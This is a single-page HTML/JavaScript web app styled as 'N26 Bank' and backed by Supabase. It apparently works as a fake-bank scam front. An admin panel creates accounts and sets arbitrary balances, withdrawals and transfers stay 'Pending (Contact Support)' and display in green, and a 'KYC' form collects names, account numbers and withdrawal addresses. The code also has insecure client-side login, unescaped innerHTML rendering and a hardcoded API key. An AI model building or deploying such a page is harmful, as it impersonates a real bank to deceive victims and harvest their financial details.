<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>N26 Bank</title>

<!-- Supabase -->
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<style>
body{margin:0;font-family:Arial;background:#f4f6fb}
.hidden{display:none}
input,button{width:100%;padding:10px;margin:5px 0;border-radius:6px;border:1px solid #ccc}
button{background:#0033cc;color:#fff;border:none}
button:hover{opacity:.9}
.card{background:#fff;padding:15px;margin:10px;border-radius:10px;box-shadow:0 5px 15px rgba(0,0,0,.1)}
.menu{position:fixed;left:-220px;top:0;width:220px;height:100%;background:#0033cc;color:#fff;padding:20px;transition:.3s}
.menu a{color:#fff;display:block;margin:15px 0;text-decoration:none}
.menu.show{left:0}
.top{background:#0033cc;color:#fff;padding:15px}
.green{color:green}
.red{color:red}
table{width:100%;border-collapse:collapse}
td,th{border:1px solid #ccc;padding:6px;font-size:12px}
</style>
</head>

<body>

<!-- MENU -->
<div id="menu" class="menu">
  <a onclick="showDash()">Dashboard</a>
  <a onclick="showHistory()">History</a>
  <a onclick="showKYC()">KYC</a>
  <a onclick="logout()">Logout</a>
</div>

<!-- LOGIN -->
<div id="loginPage" class="card">
  <h3>Login</h3>
  <input id="username" placeholder="Username">
  <input id="password" type="password" placeholder="Password">
  <button onclick="loginUser()">Login</button>
</div>

<!-- DASHBOARD -->
<div id="dashboard" class="hidden">
  <div class="top">
    ☰ <span onclick="toggleMenu()">Menu</span>
  </div>
  <div class="card">
    <h3 id="welcome"></h3>
    <p>Balance: $<span id="balance">0</span></p>
    <button onclick="placeTx('Withdrawal')">Withdraw</button>
    <button onclick="placeTx('Transfer')">Transfer</button>
  </div>
</div>

<!-- HISTORY -->
<div id="history" class="hidden card">
  <h3>Transaction History</h3>
  <div id="historyList"></div>
</div>

<!-- KYC -->
<div id="kyc" class="hidden card">
  <h3>KYC (One Time)</h3>
  <input id="fullName" placeholder="Full Name">
  <input id="accountNo" placeholder="Account Number">
  <input id="withdrawAddr" placeholder="Withdraw Address">
  <button onclick="submitKYC()">Submit KYC</button>
</div>

<!-- ADMIN -->
<div id="adminPanel" class="hidden card">
  <h3>Admin Panel</h3>

  <h4>Create User</h4>
  <input id="newUser" placeholder="Username">
  <input id="newPass" placeholder="Password">
  <button onclick="createUser()">Create User</button>

  <h4>Fund User</h4>
  <input id="fundUser" placeholder="Username">
  <input id="fundAmount" placeholder="Amount">
  <button onclick="fundUser()">Fund</button>

  <h4>Users & Transactions</h4>
  <table>
    <thead>
      <tr>
        <th>User</th><th>Type</th><th>Amount</th><th>Status</th><th>Action</th>
      </tr>
    </thead>
    <tbody id="adminTx"></tbody>
  </table>
</div>

<script>
/* SUPABASE CONFIG */
const supabase = supabase.createClient(
  "https://mvgwrkpqauzntjtxhtdd.supabase.co",
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im12Z3dya3BxYXV6bnRqdHhodGRkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYwNDE0NDcsImV4cCI6MjA4MTYxNzQ0N30.jtD2D0XXjCwiwysDApL_9375LzwFPVMpN63bTrmWzjU"
);

/* HASH */
async function hash(p){
  const d=new TextEncoder().encode(p);
  const h=await crypto.subtle.digest("SHA-256",d);
  return [...new Uint8Array(h)].map(b=>b.toString(16).padStart(2,"0")).join("");
}

/* LOGIN */
async function loginUser(){
  const u=username.value,p=password.value;
  const h=await hash(p);
  const {data}=await supabase.from("users").select("*")
  .eq("username",u).eq("password",h).single();
  if(!data)return alert("Invalid");
  localStorage.user=JSON.stringify(data);
  data.role==="admin"?showAdmin():showDash();
}

/* NAV */
function toggleMenu(){menu.classList.toggle("show")}
function hideAll(){dashboard.classList.add("hidden");history.classList.add("hidden");kyc.classList.add("hidden");adminPanel.classList.add("hidden")}
function showDash(){
  hideAll();dashboard.classList.remove("hidden");
  const u=JSON.parse(localStorage.user);
  welcome.innerText="Welcome "+u.username;
  balance.innerText=u.balance;
}
function showHistory(){hideAll();history.classList.remove("hidden");loadHistory()}
function showKYC(){hideAll();kyc.classList.remove("hidden")}
function showAdmin(){loginPage.classList.add("hidden");adminPanel.classList.remove("hidden");loadAdmin()}
function logout(){localStorage.clear();location.reload()}

/* KYC */
async function submitKYC(){
  const u=JSON.parse(localStorage.user);
  const {error}=await supabase.from("kyc").insert({
    user_id:u.id,full_name:fullName.value,
    account_number:accountNo.value,withdraw_address:withdrawAddr.value
  });
  alert(error?"Already submitted":"KYC Submitted");
}

/* TRANSACTIONS */
async function placeTx(type){
  const u=JSON.parse(localStorage.user);
  await supabase.from("transactions").insert({
    user_id:u.id,type,amount:100,status:"Pending (Contact Support)"
  });
  alert("Transaction Submitted");
}

/* HISTORY */
async function loadHistory(){
  const u=JSON.parse(localStorage.user);
  const {data}=await supabase.from("transactions").select("*").eq("user_id",u.id);
  historyList.innerHTML="";
  data.forEach(t=>{
    historyList.innerHTML+=`<p>${t.type} $${t.amount} 
    <span class="${t.status.includes('Pending')?'green':t.status==='Rejected'?'red':'green'}">
    ${t.status}</span></p>`;
  });
}

/* ADMIN */
async function createUser(){
  const h=await hash(newPass.value);
  const {error}=await supabase.from("users").insert({username:newUser.value,password:h});
  alert(error?"Failed":"User Created");
}

async function fundUser(){
  const {data}=await supabase.from("users").select("*").eq("username",fundUser.value).single();
  await supabase.from("users").update({balance:fundAmount.value}).eq("id",data.id);
  await supabase.from("transactions").insert({
    user_id:data.id,type:"Deposit",amount:fundAmount.value,status:"Successful"
  });
  alert("Funded Successfully");
}

async function loadAdmin(){
  const {data}=await supabase.from("transactions").select("*,users(username)");
  adminTx.innerHTML="";
  data.forEach(t=>{
    adminTx.innerHTML+=`
    <tr>
      <td>${t.users.username}</td>
      <td>${t.type}</td>
      <td>$${t.amount}</td>
      <td class="${t.status.includes('Pending')?'green':t.status==='Rejected'?'red':'green'}">${t.status}</td>
      <td>
        ${t.status.includes("Pending")?
        `<button onclick="approve('${t.id}','${t.user_id}',${t.amount})">✔</button>
         <button onclick="reject('${t.id}')">✖</button>`:""}
      </td>
    </tr>`;
  });
}

async function approve(id,uid,amt){
  await supabase.from("transactions").update({status:"Successful"}).eq("id",id);
  const {data}=await supabase.from("users").select("balance").eq("id",uid).single();
  await supabase.from("users").update({balance:data.balance-amt}).eq("id",uid);
  loadAdmin();
}

async function reject(id){
  await supabase.from("transactions").update({status:"Rejected"}).eq("id",id);
  loadAdmin();
}
</script>
</body>
</html>
